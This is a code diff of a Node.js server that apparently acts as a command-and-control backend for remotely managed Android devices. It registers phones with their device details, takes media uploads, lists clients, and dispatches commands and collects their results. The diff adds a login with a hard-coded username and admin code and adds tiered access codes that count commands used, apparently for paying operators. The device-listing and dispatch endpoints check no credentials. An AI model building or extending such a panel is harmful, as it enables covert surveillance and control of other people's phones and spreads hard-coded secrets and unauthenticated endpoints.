@@ -10,18 +10,23 @@ const SUPABASE_URL = process.env.SUPABASE_URL;
 const SUPABASE_KEY = process.env.SUPABASE_KEY;
 const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, { auth: { persistSession: false } });
 
+const ADMIN_CODE = "201019";
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });
-
 function ts() { return Date.now(); }
 
 // --- CLIENT ENDPOINTS ---
 app.post('/connect', async (req, res) => {
   try {
     const { userId, device, android, battery, network, androidId } = req.body;
+    const { data: row } = await supabase.from('codes').select('*').eq('code', userId).maybeSingle();
+    
+    if (!row) return res.json({ ok: false, err: 'invalid_code' });
+
     await supabase.from('devices').upsert({
       user_id: userId, android_id: androidId, device: device, android: android,
-      battery: battery, network: network, last_seen: ts()
+      battery: battery, network: network, last_seen: ts(), tier: row.tier
     }, { onConflict: 'user_id' });
+    
     res.json({ ok: true });
   } catch (e) { res.json({ ok: false }); }
 });
@@ -57,6 +62,17 @@ app.post('/media', upload.single('file'), async (req, res) => {
 });
 
 // --- PANEL ENDPOINTS ---
+app.post('/auth', async (req, res) => {
+  const { username, password } = req.body;
+  if (username !== 'VOID') return res.json({ ok: false });
+  if (password === ADMIN_CODE) return res.json({ ok: true, token: 'admin', userId: ADMIN_CODE, admin: true, tier: 'vip', commands_used: 0 });
+  
+  const { data: row } = await supabase.from('codes').select('*').eq('code', password).maybeSingle();
+  if (!row) return res.json({ ok: false, err: 'invalid_code' });
+
+  res.json({ ok: true, token: 'user', userId: password, admin: false, tier: row.tier, commands_used: row.used_commands || 0 });
+});
+
 app.get('/clients', async (req, res) => {
   const { data } = await supabase.from('devices').select('*');
   const list = (data || []).map(d => ({
@@ -70,11 +86,13 @@ app.get('/client', async (req, res) => {
   const id = req.query.id;
   const { data: d } = await supabase.from('devices').select('*').eq('user_id', id).maybeSingle();
   const { data: results } = await supabase.from('results').select('*').eq('user_id', id).order('created_at', { ascending: false }).limit(10);
+  const { data: uploads } = await supabase.from('uploads').select('*').eq('user_id', id).order('created_at', { ascending: false }).limit(10);
   
   res.json({
     ok: true, userId: id, online: d && (ts() - d.last_seen) < 30000,
     device: d ? d.device : '?', android: d ? d.android : '?',
-    results: (results || []).reverse().map(r => ({ cmd: r.cmd, data: r.data, at: r.created_at }))
+    results: (results || []).reverse().map(r => ({ cmd: r.cmd, data: r.data, at: r.created_at })),
+    uploads: (uploads || []).reverse().map(u => ({ type: u.type, url: u.url, name: u.name, at: u.created_at }))
   });
 });
 
@@ -85,7 +103,5 @@ app.post('/dispatch', async (req, res) => {
   res.json({ ok: true });
 });
 
-// --- THE KEEP-ALIVE PING ---
 app.get('/', (req, res) => res.send('Server Running'));
-
 app.listen(process.env.PORT || 3000, () => console.log('Server running'));
